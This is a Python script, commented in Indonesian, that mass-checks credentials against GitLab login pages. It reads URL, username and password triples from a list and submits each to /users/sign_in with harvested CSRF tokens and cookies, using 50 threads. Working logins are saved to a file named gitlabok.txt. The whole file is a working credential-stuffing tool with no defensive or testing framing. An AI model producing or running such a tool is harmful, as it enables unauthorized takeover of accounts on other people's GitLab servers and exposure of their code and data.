import requests
from bs4 import BeautifulSoup
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

def get_login_data(url):
    session = requests.Session()
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Mengambil authenticity_token
        token = soup.find('input', {'name': 'authenticity_token'})['value']
        
        # Mengambil cookie dari response
        cookies = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
        
        return token, cookies, session
    except requests.RequestException as e:
        print(f"[-] Error Login Form {url}")
        return None, None, None

def check_login(url, username, password):
    try:
        token, cookies, session = get_login_data(url)
        if not all([token, cookies, session]):
            return False, f"[-] Error Form {url}"
        
        headers = {
            "Host": re.search(r'https?://([^/]+)', url).group(1),
            "Cookie": cookies,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": url
        }
        
        data = {
            "authenticity_token": token,
            "user[login]": username,
            "user[password]": password,
            "user[remember_me]": "0"
        }
        
        response = session.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
        
        if response.status_code == 302:
            location = response.headers.get('Location')
            base_url = re.search(r'(https?://[^/]+)', url).group(1)
            if location == f"{base_url}/" or location == "/":
                return True, (url, username, password)
        
        return False, f"[-] Failed {username} => {url}"
    
    except requests.RequestException as e:
        return False, f"[-] Connection Error {url}"
    except Exception as e:
        return False, f"[-] Uknown Error {url}"

def process_login(line):
    parts = line.strip().split()
    if len(parts) != 3:
        return False, f"[-] Format Invalid {line}"
    url, username, password = parts
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    if not url.endswith('/users/sign_in'):
        url = url.rstrip('/') + '/users/sign_in'
    return check_login(url, username, password)

def main():
    print("Memulai pengecekan login massal...")
    start_time = time.time()
    
    successful_logins = []
    total_checks = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_line = {executor.submit(process_login, line): line for line in open('list.txt', 'r')}
        for future in as_completed(future_to_line):
            success, result = future.result()
            if success:
                successful_logins.append(result)
                print(f"[+] Login Success : {result[1]} di {result[0]}")
            else:
                print(result)  # Ini akan mencetak pesan error
            total_checks += 1
    
    with open('gitlabok.txt', 'w') as f:
        for url, username, password in successful_logins:
            # Menghapus '/users/sign_in' dari URL sebelum menyimpan
            base_url = url.replace('/users/sign_in', '')
            f.write(f"{base_url} {username} {password}\n")
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\nPengecekan selesai dalam {duration:.2f} detik.")
    print(f"Total pengecekan: {total_checks}")
    print(f"Login berhasil: {len(successful_logins)}")
    print(f"Hasil login yang berhasil disimpan di gitlabok.txt")

if __name__ == "__main__":
    main()